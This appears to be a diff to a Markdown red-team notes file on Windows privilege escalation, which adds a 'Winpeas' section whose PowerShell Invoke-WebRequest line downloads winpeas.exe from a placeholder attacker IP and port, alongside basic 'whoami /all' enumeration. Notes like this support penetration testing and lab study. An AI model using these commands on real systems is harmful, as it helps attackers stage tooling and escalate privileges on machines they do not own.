@@ -1,5 +1,10 @@
 https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
 
+### Winpeas
+```
+Invoke-WebRequest -Uri http://<Attack_ip>:<PORT>/winpeas.exe -Outfile winpeas.exe
+```
+
 ### Basic Enumeration
 ``` bash
 whoami /all                 # Privileges and groups
